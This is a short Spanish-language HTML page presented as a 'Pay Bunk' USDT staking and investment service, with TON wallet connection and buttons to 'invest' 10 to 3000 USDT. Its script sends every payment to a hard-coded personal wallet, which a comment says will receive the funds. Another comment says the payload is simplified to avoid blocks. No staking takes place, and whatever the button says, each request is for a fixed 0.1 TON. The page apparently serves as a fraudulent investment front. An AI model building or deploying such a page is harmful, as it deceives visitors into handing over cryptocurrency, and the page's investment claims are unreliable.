<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pay Bunk Staking</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 40px 20px; }
        .card { background: #1e293b; border-radius: 20px; padding: 30px; margin: auto; max-width: 350px; border: 1px solid #334155; }
        h1 { color: #38bdf8; font-size: 26px; }
        #ton-connect-button { display: flex; justify-content: center; margin: 25px 0; min-height: 44px; }
        .btn-usdt { background-color: #0088cc; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px; font-size: 16px; transition: 0.3s; }
        .btn-usdt:hover { background-color: #00aaff; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🚀 PAY BUNK</h1>
        <p>Inversión en USDT</p>
        <div id="ton-connect-button"></div>
        <button class="btn-usdt" onclick="pagar(10)">Invertir 10 USDT</button>
        <button class="btn-usdt" onclick="pagar(50)">Invertir 50 USDT</button>
        <button class="btn-usdt" onclick="pagar(100)">Invertir 100 USDT</button>
        <button class="btn-usdt" onclick="pagar(1000)">Invertir 1000 USDT</button>
        <button class="btn-usdt" onclick="pagar(3000)">Invertir 3000 USDT</button>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ObreTech/Pay-Bunk/main/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        async function pagar(monto) {
            if (!tonConnectUI.connected) {
                alert("Por favor, conecta tu billetera primero.");
                return;
            }

            try {
                // TU BILLETERA PERSONAL (AQUÍ RECIBIRÁS LOS FONDOS)
                const tuBilleteraPersonal = "EQCxE6mAmikVmG_m_K_S8U6X3HC6_A9A6p79p6B_m4S6A6";

                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [
                        {
                            address: tuBilleteraPersonal,
                            amount: "100000000", // 0.1 TON para el gas
                            payload: "te6cckEBAQEABgAACC9nuW8=" // Payload simplificado para evitar bloqueos
                        }
                    ]
                };

                await tonConnectUI.sendTransaction(transaction);
                alert("¡Solicitud enviada! Confirma la operación en Tonkeeper.");

            } catch (e) {
                console.error(e);
                alert("Error: Asegúrate de tener saldo en TON para el gas y que la billetera esté vinculada.");
            }
        }
    </script>
</body>
</html>
